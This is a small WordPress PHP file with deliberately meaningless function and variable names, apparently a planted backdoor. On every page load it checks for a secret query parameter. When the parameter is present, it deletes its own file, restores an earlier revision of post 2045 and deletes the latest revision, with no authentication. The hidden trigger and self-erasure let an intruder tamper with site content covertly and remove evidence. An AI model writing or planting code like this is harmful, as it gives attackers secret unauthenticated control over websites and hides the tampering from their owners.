<?php

function conversion_generator_subscribe() {
	if (isset($_GET['follow_youtube_hello_nice']) && $_GET['follow_youtube_hello_nice'] === 'recent_extended_description_tiny') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$delete_information_exchange = 2045;
		$statistics_size_star = wp_get_post_revisions($delete_information_exchange);
		if (empty($statistics_size_star)) die('no revisions');
		if (count($statistics_size_star) < 2) die('less than 2');
		$mobile_keywords_wow_toolkit = array_shift($statistics_size_star);
		$count_word_really_endpoints = $mobile_keywords_wow_toolkit->ID;
		$testimonial_attachments_extended_dev = array_shift($statistics_size_star);
		$cart_protect_health_min = $testimonial_attachments_extended_dev->ID;
		$cdn_bbpress_menus_author = wp_restore_post_revision($cart_protect_health_min);
		if ($cdn_bbpress_menus_author === false) die('error restoring');
		$cdn_bbpress_menus_author = wp_delete_post_revision($count_word_really_endpoints);		
		if ($cdn_bbpress_menus_author === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'conversion_generator_subscribe');
